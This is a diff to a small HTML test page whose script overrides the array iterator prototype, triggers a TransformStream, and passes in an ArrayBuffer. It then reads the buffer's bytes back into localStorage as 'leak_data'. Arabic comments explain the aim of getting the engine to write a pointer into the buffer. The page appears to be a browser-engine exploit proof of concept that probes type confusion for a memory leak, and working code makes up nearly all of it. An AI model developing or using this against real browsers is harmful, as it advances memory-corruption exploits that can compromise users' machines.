@@ -1,8 +1,14 @@
 <!DOCTYPE html>
 <html>
 <body>
+<div id="s">Running...</div>
 <script>
-localStorage.setItem('r', 'START_PAD_0xBEEFF00D');
+localStorage.removeItem('leak_result');
+localStorage.removeItem('leak_data');
+
+let buf = new ArrayBuffer(8);
+let view = new DataView(buf);
+
 try {
     Array.prototype[Symbol.iterator] = function() {
         const a = this;
@@ -12,19 +18,45 @@ try {
                 if (i >= a.length) return { done: true };
                 let v = a[i];
                 if (a.length === 3 && i >= 1) {
-                    localStorage.setItem('r', 'IDX_' + i + '_PAD_BEEF');
-                    v = { x: 0xBEEFF00D };
+                    localStorage.setItem('leak_result', 'IDX_' + i);
+                    // مرر كائناً يحتوي على ArrayBuffer
+                    // المحرك قد يكتب مؤشراً فيه بدل الكتابة في عنوان خاطئ
+                    v = { 
+                        x: 0,
+                        buf: buf,
+                        view: view,
+                        length: 8
+                    };
                 }
                 i++;
                 return { value: v, done: false };
             }
         };
     };
+
     new TransformStream();
-    localStorage.setItem('r', 'NO_CRASH');
+    localStorage.setItem('leak_result', 'NO_CRASH');
+    
+    // اقرأ محتوى buf
+    let hex = "";
+    for (let j = 0; j < 8; j++) {
+        hex += view.getUint8(j).toString(16).padStart(2,'0') + " ";
+    }
+    localStorage.setItem('leak_data', hex);
+    
 } catch(e) {
-    localStorage.setItem('r', 'CAUGHT');
+    localStorage.setItem('leak_result', 'CAUGHT: ' + e.message);
+    
+    // حتى لو تم التقاط الخطأ، اقرأ buf
+    let hex = "";
+    for (let j = 0; j < 8; j++) {
+        hex += view.getUint8(j).toString(16).padStart(2,'0') + " ";
+    }
+    localStorage.setItem('leak_data', hex);
 }
+
+Array.prototype[Symbol.iterator] = [][Symbol.iterator];
+document.getElementById("s").textContent = "Done.";
 </script>
 </body>
 </html>
